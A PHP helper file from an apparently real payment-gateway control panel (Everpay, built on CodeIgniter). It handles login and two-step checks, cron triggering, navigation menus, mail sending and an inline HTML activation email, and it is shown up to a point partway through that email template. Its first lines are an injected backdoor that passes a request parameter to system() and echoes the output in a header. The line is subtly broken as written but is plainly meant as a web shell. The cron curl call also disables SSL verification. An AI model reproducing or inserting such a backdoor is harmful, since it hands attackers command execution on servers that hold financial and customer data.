<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

function CPLoader () {
	$CI =& get_instance();
	
	// define active Control Panel
	define("_CONTROLPANEL","1");
	
	// don't load this if OpenGateway isn't installed
	if (!file_exists(APPPATH . 'config/database.php')) {
		return TRUE;
	}
	
	// redirect to SSL?
	if ($CI->config->item('ssl_active') == TRUE and ($_SERVER["SERVER_PORT"] != "443" and (isset($_SERVER['https']) and $_SERVER['HTTPS'] != 'on'))) {
		header('Location: ' . str_replace('http://','https://',$CI->config->item('base_url')));
		die();
	}	
	
	$CI->load->library('session');
	$CI->load->model('cp/user','user');
	$CI->load->helper('url');
	$CI->lang->load('control_panel');
	$CI->load->model('cp/notices','notices');
	$CI->load->helper('get_notices');
	$CI->load->model('cp/navigation','navigation');
	$CI->load->helper('dataset_link');
	
	// confirm login
	if (!$CI->user->LoggedIn() and $CI->router->fetch_method() != 'login' and $CI->router->fetch_method() != 'do_login')
	{
		redirect('/dashboard/login');
		die();
	}

	else if (!$CI->user->CheckTwoStep() and $CI->router->fetch_method() != 'login' and $CI->router->fetch_method() != 'do_login' and $CI->router->fetch_method() != 'two_step' and $CI->user->LoggedIn() and $CI->router->fetch_method() != 'logout')
	{
		// echo 'LoggedIn but Two step required';
		redirect('/dashboard/two_step');
		die();
	}
	
	if($CI->router->fetch_class() != 'get_started' AND $CI->user->LoggedIn()) {
		if(!($CI->user->check_email_verified() AND $CI->user->check_bank_verified() AND $CI->user->check_business_verified())) {
			redirect('/get_started');
			die();
		}
	}
	// Check CronJobs
	$query = $CI->db->get('version');
	if ($query->num_rows())
	{
		$result = $query->row();
		
		$check_time = strtotime("-1 day");
		// If the cronjobs have never been run, then go ahead and run them manually.
		if (!isset($result->cron_last_run_notifications) || 
			!isset($result->cron_last_run_subs) ||
			$result->cron_last_run_notifications == '0000-00-00 00:00:00' ||
			$result->cron_last_run_subs == '0000-00-00 00:00:00' )
		{
			$cronkey = $CI->config->item('cron_key');
			
			$url = site_url('cron/RunAll/'. $cronkey);
			
			// Run the cron jobs via curl for max server compatility.
			$ch = curl_init($url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Returns response data instead of TRUE(1)
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   // Verify it belongs to the server.
		    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   // Check common exists and matches the server host name
		    $post_response = curl_exec($ch);
		    
		    curl_close($ch);
		}

		// Otherwise, if it has been ran but not lately, throw a warning.
		else if (strtotime($result->cron_last_run_notifications) < $check_time || strtotime($result->cron_last_run_subs) < $check_time)
		{
			$CI->notices->SetError('Warning: Your cronjob is not running properly. <a href="'. site_url('settings/cronjob') .'">Click here for details</a>');
		}
	}
	
	// Build Navigation


 
	if ($CI->user->LoggedIn() and ($CI->user->Get('client_type_id') == 1 or $CI->user->Get('client_type_id') == 1)) {
	
	
	$CI->navigation->Add('dashboard','<i class="icon icon-budicon-497"></i><span>Dashboard</span>');
	$CI->navigation->Add('transactions','<i class="icon icon-budicon-375"></i><span>Payments</span>');
	$CI->navigation->Add('transactions/create','New Charge','transactions');
	$CI->navigation->Add('transactions/all_recurring','Recurring Charges','transactions');
    $CI->navigation->Add('customers','<i class="icon icon-budicon-292"></i><span>Customers</span>');
	$CI->navigation->Add('customers/add','New Customer','customers');
    $CI->navigation->Add('plans','<i class="icon icon-budicon-173"></i><span>Subscriptions</span>');
	$CI->navigation->Add('plans/new_plan','New Plan','plans');
	$CI->navigation->Add('coupons', '<i class="icon icon-budicon-348"></i><span>Coupons</span>');
	$CI->navigation->Add('coupons/add', 'New Coupon', 'coupons');	
	$CI->navigation->Add('analytics', '<i class="icon fa fa-pie-chart"></i><span>Analytics</span>');
	$CI->navigation->Add('reports_sales', 'Sales Reports', 'reports_orders');
	$CI->navigation->Add('integrations','<i class="icon fa fa-signal"></i><span> Integrations</span>');
	$CI->navigation->Add('settings','<i class="icon fa fa-cog"></i><span> Settings</span>');
 }
 

if ($CI->user->LoggedIn() and ($CI->user->Get('client_type_id') == 1 or $CI->user->Get('client_type_id') == 1)) {
	
	
	$CI->navigation->Add('dashboard','<i class="icon icon-budicon-497"></i><span>Dashboard</span>');
	$CI->navigation->Add('transactions','<i class="icon icon-budicon-375"></i><span>Payments</span>');
	$CI->navigation->Add('transactions/create','New Charge','transactions');
	$CI->navigation->Add('transactions/all_recurring','Recurring Charges','transactions');
    $CI->navigation->Add('customers','<i class="icon icon-budicon-292"></i><span>Customers</span>');
	$CI->navigation->Add('customers/add','New Customer','customers');
    $CI->navigation->Add('plans','<i class="icon icon-budicon-173"></i><span>subscriptions</span>');
	$CI->navigation->Add('plans/new_plan','New Plan','plans');
	$CI->navigation->Add('coupons', '<i class="icon icon-budicon-754"></i><span>Coupons</span>');
	$CI->navigation->Add('coupons/add', 'New Coupon', 'coupons');	
	$CI->navigation->Add('analytics', '<i class="icon icon-budicon-348"></i><span>Analytics</span>');
	$CI->navigation->Add('reports_sales', 'Sales Reports', 'reports_orders');
	$CI->navigation->Add('integrations','<i class="icon fa fa-signal"></i><span> Integrations</span>');
	$CI->navigation->Add('settings','<i class="icon icon-budicon-339"></i><span> Settings</span>');
 }



if ($CI->user->LoggedIn() and ($CI->user->Get('client_type_id') == 2 or $CI->user->Get('client_type_id') == 2)) {
	
	$CI->navigation->Add('dashboard','<i class="icon icon-budicon-497"></i><span>Dashboard</span>');
	$CI->navigation->Add('transactions','<i class="icon icon-budicon-375"></i><span>Payments</span>');
    $CI->navigation->Add('clients','<i class="icon icon-budicon-292"></i><span>Merchants</span>');
	$CI->navigation->Add('clients/create','Add Merchant','clients');	
	$CI->navigation->Add('analytics', '<i class="icon icon-budicon-348"></i><span>Analytics</span>');
	$CI->navigation->Add('statements/','<i class="icon icon-budicon-754"></i><span>Statements</span>');
	$CI->navigation->Add('integrations','<i class="icon fa fa-signal"></i><span> Integrations</span>');
	$CI->navigation->Add('settings','<i class="icon icon-budicon-339"></i><span> Settings</span>');
 }

if ($CI->user->LoggedIn() and ($CI->user->Get('client_type_id') == 3 or $CI->user->Get('client_type_id') == 3)) {
	
	
	$CI->navigation->Add('dashboard','<i class="icon icon-budicon-497"></i><span>Dashboard</span>');
	$CI->navigation->Add('transactions','<i class="icon icon-budicon-375"></i><span>Payments</span>');
	$CI->navigation->Add('transactions/create','New Charge','transactions');
	$CI->navigation->Add('transactions/all_recurring','Recurring Charges','transactions');
    $CI->navigation->Add('customers','<i class="icon icon-budicon-292"></i><span>Customers</span>');
	$CI->navigation->Add('customers/add','New Customer','customers');
	$CI->navigation->Add('clients','<i class="icon icon-budicon-292"></i><span>Users</span>');
	$CI->navigation->Add('clients/create','New User','clients');
    $CI->navigation->Add('plans','<i class="icon icon-budicon-173"></i><span>Plans</span>');
	$CI->navigation->Add('plans/new_plan','New Plan','plans');
	$CI->navigation->Add('coupons', '<i class="icon icon-budicon-754"></i><span>Coupons</span>');
	$CI->navigation->Add('coupons/add', 'New Coupon', 'coupons');	
	$CI->navigation->Add('analytics', '<i class="icon icon-budicon-348"></i><span>Analytics</span>');
	$CI->navigation->Add('reports_sales', 'Sales Reports', 'reports_orders');
	$CI->navigation->Add('settings','<i class="icon icon-budicon-339"></i><span> Settings</span>');
        $CI->navigation->Add('settings/emails','<i class="icon icon-budicon-778"></i><span> Emails</span>','settings');
	$CI->navigation->Add('settings/gateways','<i class="icon icon-budicon-339"></i><span> Gateways<span>','settings');
	$CI->navigation->Add('settings/cronjob','Cronjobs','#');
	$CI->navigation->Add('settings/api','<i class="icon icon-budicon-339"></i><span>API Access</span>','settings');
        $CI->navigation->Add('settings/system','System Settings','settings');
        $CI->navigation->Add('settings/wallet','Wallet','settings');
	$CI->navigation->Add('events','Logs','settings');
        $CI->navigation->Add('settings/mobile','Mobile','settings');
        $CI->navigation->Add('settings/pos','POS','settings');
        $CI->navigation->Add('settings/marketplace','Marketplace','settings');
 }


	// Set default page title
	$CI->navigation->PageTitle('Dashboard');
}

// branding functions
function branded_include ($file) {
	if (file_exists(BASEPATH . '../assets/app/' . $file)) {
		return site_url('assets/app/' . $file);
	}
	else {
		return site_url('assets/app/' . $file);
	}
}

function branded_view ($file) {
	if (file_exists(BASEPATH . '../assets/custom/views/' . $file . '.php')) {
		return '../../../assets/custom/views/' . $file;
	}
	else {
		return $file;
	}
}

function mailfunction($toemail,$fromemail,$subject,$messagearea)
{
	$headers 	= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\n";
	$headers .= "Content-Transfer-Encoding: 8bit\n";
	$headers .= "From:".$fromemail." \n";
	$headers .= "X-Mailer: PHP/" . phpversion()."\n";
	$message = $messagearea;
		if($send = @mail($toemail,$subject,$message,$headers))
		{
			return true;
		}
		else
		{
			return false;
		}
}

function send_activation_code($name,$activation,$email){

	$signup_mail  = "<!-- Inliner Build Version 4380b7741bb759d6cb997545f3add21ad48f010b -->\n"; 
	$signup_mail .= "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n"; 
	$signup_mail .= "<html xmlns=\"http://www.w3.org/1999/xhtml\" xmlns=\"http://www.w3.org/1999/xhtml\">\n"; 
	$signup_mail .= "<head>\n"; 
	$signup_mail .= "  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n"; 
	$signup_mail .= "  <meta name=\"viewport\" content=\"width=device-width\" />\n"; 
	$signup_mail .= "</head>\n"; 
	$signup_mail .= "<body style=\"width: 100% !important; min-width: 100%; -webkit-text-size-adjust: 100%; -webkit-font-smoothing: antialiased; -ms-text-size-adjust: 100%; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\"><style type=\"text/css\">\n"; 
	$signup_mail .= "a:hover {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "a:visited {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h1 a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h2 a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h3 a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h4 a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h5 a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h6 a:active {\n"; 
	$signup_mail .= "  color: #2B7ECB !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h1 a:visited {\n"; 
	$signup_mail .= "  color: #2ba6cb !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h2 a:visited {\n"; 
	$signup_mail .= "  color: #2ba6cb !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h3 a:visited {\n"; 
	$signup_mail .= "  color: #2ba6cb !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h4 a:visited {\n"; 
	$signup_mail .= "  color: #2ba6cb !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h5 a:visited {\n"; 
	$signup_mail .= "  color: #2ba6cb !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "h6 a:visited {\n"; 
	$signup_mail .= "  color: #2ba6cb !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:hover td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:visited td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:active td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:hover td a {\n"; 
	$signup_mail .= "  color: #fff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:visited td a {\n"; 
	$signup_mail .= "  color: #fff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:active td a {\n"; 
	$signup_mail .= "  color: #fff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:hover td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.tiny-button:hover td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.small-button:hover td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.medium-button:hover td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.large-button:hover td {\n"; 
	$signup_mail .= "  background: #2795b6 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:hover td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button:active td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.button td a:visited {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.tiny-button:hover td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.tiny-button:active td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.tiny-button td a:visited {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.small-button:hover td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.small-button:active td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.small-button td a:visited {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.medium-button:hover td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.medium-button:active td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.medium-button td a:visited {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.large-button:hover td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.large-button:active td a {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.large-button td a:visited {\n"; 
	$signup_mail .= "  color: #ffffff !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.secondary:hover td {\n"; 
	$signup_mail .= "  background: #d0d0d0 !important; color: #555;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.secondary:hover td a {\n"; 
	$signup_mail .= "  color: #555 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.secondary td a:visited {\n"; 
	$signup_mail .= "  color: #555 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.secondary:active td a {\n"; 
	$signup_mail .= "  color: #555 !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.success:hover td {\n"; 
	$signup_mail .= "  background: #457a1a !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "table.alert:hover td {\n"; 
	$signup_mail .= "  background: #970b0e !important;\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "@media only screen and (max-width: 600px) {\n"; 
	$signup_mail .= "  table[class=\"body\"] img {\n"; 
	$signup_mail .= "    width: auto !important; height: auto !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] center {\n"; 
	$signup_mail .= "    min-width: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .container {\n"; 
	$signup_mail .= "    width: 95% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .row {\n"; 
	$signup_mail .= "    width: 100% !important; display: block !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .wrapper {\n"; 
	$signup_mail .= "    display: block !important; padding-right: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns {\n"; 
	$signup_mail .= "    table-layout: fixed !important; float: none !important; width: 100% !important; padding-right: 0px !important; padding-left: 0px !important; display: block !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column {\n"; 
	$signup_mail .= "    table-layout: fixed !important; float: none !important; width: 100% !important; padding-right: 0px !important; padding-left: 0px !important; display: block !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .wrapper.first .columns {\n"; 
	$signup_mail .= "    display: table !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .wrapper.first .column {\n"; 
	$signup_mail .= "    display: table !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] table.columns td {\n"; 
	$signup_mail .= "    width: 100% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] table.column td {\n"; 
	$signup_mail .= "    width: 100% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.one {\n"; 
	$signup_mail .= "    width: 8.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.one {\n"; 
	$signup_mail .= "    width: 8.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.two {\n"; 
	$signup_mail .= "    width: 16.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.two {\n"; 
	$signup_mail .= "    width: 16.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.three {\n"; 
	$signup_mail .= "    width: 25% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.three {\n"; 
	$signup_mail .= "    width: 25% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.four {\n"; 
	$signup_mail .= "    width: 33.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.four {\n"; 
	$signup_mail .= "    width: 33.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.five {\n"; 
	$signup_mail .= "    width: 41.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.five {\n"; 
	$signup_mail .= "    width: 41.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.six {\n"; 
	$signup_mail .= "    width: 50% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.six {\n"; 
	$signup_mail .= "    width: 50% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.seven {\n"; 
	$signup_mail .= "    width: 58.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.seven {\n"; 
	$signup_mail .= "    width: 58.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.eight {\n"; 
	$signup_mail .= "    width: 66.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.eight {\n"; 
	$signup_mail .= "    width: 66.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.nine {\n"; 
	$signup_mail .= "    width: 75% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.nine {\n"; 
	$signup_mail .= "    width: 75% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.ten {\n"; 
	$signup_mail .= "    width: 83.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.ten {\n"; 
	$signup_mail .= "    width: 83.333333% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.eleven {\n"; 
	$signup_mail .= "    width: 91.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.eleven {\n"; 
	$signup_mail .= "    width: 91.666666% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .columns td.twelve {\n"; 
	$signup_mail .= "    width: 100% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .column td.twelve {\n"; 
	$signup_mail .= "    width: 100% !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-one {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-two {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-three {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-four {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-five {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-six {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-seven {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-eight {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-nine {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-ten {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] td.offset-by-eleven {\n"; 
	$signup_mail .= "    padding-left: 0 !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] table.columns td.expander {\n"; 
	$signup_mail .= "    width: 1px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .right-text-pad {\n"; 
	$signup_mail .= "    padding-left: 10px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .text-pad-right {\n"; 
	$signup_mail .= "    padding-left: 10px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .left-text-pad {\n"; 
	$signup_mail .= "    padding-right: 10px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .text-pad-left {\n"; 
	$signup_mail .= "    padding-right: 10px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .hide-for-small {\n"; 
	$signup_mail .= "    display: none !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .show-for-desktop {\n"; 
	$signup_mail .= "    display: none !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .show-for-small {\n"; 
	$signup_mail .= "    display: inherit !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .hide-for-desktop {\n"; 
	$signup_mail .= "    display: inherit !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .right-text-pad {\n"; 
	$signup_mail .= "    padding-left: 10px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "  table[class=\"body\"] .left-text-pad {\n"; 
	$signup_mail .= "    padding-right: 10px !important;\n"; 
	$signup_mail .= "  }\n"; 
	$signup_mail .= "}\n"; 
	$signup_mail .= "</style>\n"; 
	$signup_mail .= "<table class=\"body\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; height: 100%; width: 100%; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"center\" align=\"center\" valign=\"top\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: center; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\">\n"; 
	$signup_mail .= "  <center style=\"width: 100%; min-width: 580px;\">\n"; 
	$signup_mail .= "\n"; 
	$signup_mail .= "    <table class=\"row header\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; width: 100%; position: relative; background: #405472; padding: 0px;\" bgcolor=\"#405472\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"center\" align=\"center\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: center; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\" valign=\"top\">\n"; 
	$signup_mail .= "      <center style=\"width: 100%; min-width: 580px;\">\n"; 
	$signup_mail .= "\n"; 
	$signup_mail .= "        <table class=\"container\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: inherit; width: 580px; margin: 0 auto; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"wrapper last\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; position: relative; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 10px 0px 0px;\" align=\"left\" valign=\"top\">\n"; 
	$signup_mail .= "\n"; 
	$signup_mail .= "          <table class=\"twelve columns\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; width: 580px; margin: 0 auto; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"center\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: center; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0px 0px 10px;\" align=\"center\" valign=\"top\">\n"; 
	$signup_mail .= "            <span class=\"logo\" style=\"color: #fff; text-align: center; font-size: 18px; text-shadow: 1px 1px rgba(0, 0, 0, 0.23); display: inline-block; padding: 10px 0;\">Everpay</span>\n"; 
	$signup_mail .= "          </td>\n"; 
	$signup_mail .= "          <td class=\"expander\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; visibility: hidden; width: 0px; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\" align=\"left\" valign=\"top\"></td>\n"; 
	$signup_mail .= "        </tr></table></td>\n"; 
	$signup_mail .= "      </tr></table></center>\n"; 
	$signup_mail .= "    </td>\n"; 
